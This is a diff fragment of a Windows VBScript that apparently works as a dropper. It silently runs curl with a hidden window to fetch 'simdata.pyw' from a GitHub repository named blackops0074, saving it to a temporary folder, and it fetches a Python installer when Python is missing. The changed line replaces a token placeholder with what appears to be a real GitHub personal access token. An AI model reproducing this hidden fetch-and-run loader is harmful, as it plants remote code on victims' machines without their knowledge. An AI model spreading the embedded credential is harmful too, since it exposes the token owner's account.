@@ -7,7 +7,7 @@ Dim pw1, pw2
 pw1 = l & "\Programs\Python\Python311\pythonw.exe"
 pw2 = "C:\Program Files\Python311\pythonw.exe"
 Dim cmd1
-cmd1 = "cmd /c curl -H ""Authorization: token YOUR_TOKEN_HERE"" -L https://raw.githubusercontent.com/blackops0074/simdata/main/simdata.pyw -o " & t & "\s.pyw"
+cmd1 = "cmd /c curl -H ""Authorization: token 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"" -L https://raw.githubusercontent.com/blackops0074/simdata/main/simdata.pyw -o " & t & "\s.pyw"
 o.Run cmd1, 0, True
 If Not fso.FileExists(pw1) And Not fso.FileExists(pw2) Then
     o.Run "cmd /c curl -L https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe -o " & t & "\py.exe", 0, True
